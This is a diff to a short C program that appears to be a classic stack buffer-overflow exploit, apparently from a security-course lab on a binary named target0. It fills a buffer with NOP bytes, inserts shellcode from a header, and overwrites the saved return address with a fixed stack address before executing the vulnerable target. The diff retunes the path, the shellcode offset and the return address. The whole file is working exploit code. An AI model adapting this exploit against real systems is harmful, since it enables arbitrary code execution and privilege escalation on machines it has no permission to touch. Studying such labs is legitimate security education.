@@ -5,30 +5,30 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/tmp/target0"
+#define TARGET "/srv/target0"
 
 int main(void)
 {
-  char *args[3];
-  char *env[1];
+    char *args[3];
+    char *env[1];
 
-  char buf[424];
-  memset(buf, 0x90, 424);
-  memcpy(buf+200, shellcode, sizeof(shellcode));
+    char buf[424];
+    memset(buf, 0x90, 424);
+    memcpy(buf + 212, shellcode, sizeof(shellcode));
 
-  uint32_t *addr_ptr = (uint32_t*)(buf + 412);
-  *addr_ptr++ = 0xffffcf5c;
-  *addr_ptr++ = 0xffffcf5c;  
-  *addr_ptr++ = 0xffffcf5c;
+    uint32_t *addr_ptr = (uint32_t*)(buf + 412);
+    *addr_ptr++ = 0xffffcf50;
+    *addr_ptr++ = 0xffffcf50;
+    *addr_ptr++ = 0xffffcf50;
 
-  args[0] = TARGET;
-  args[1] = buf;
-  args[2] = NULL;
+    args[0] = TARGET;
+    args[1] = buf;
+    args[2] = NULL;
 
-  env[0] = NULL;
+    env[0] = NULL;
 
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+    execve(TARGET, args, env);
+    fprintf(stderr, "execve failed.\n");
 
-  return 0;
+    return 0;
 }
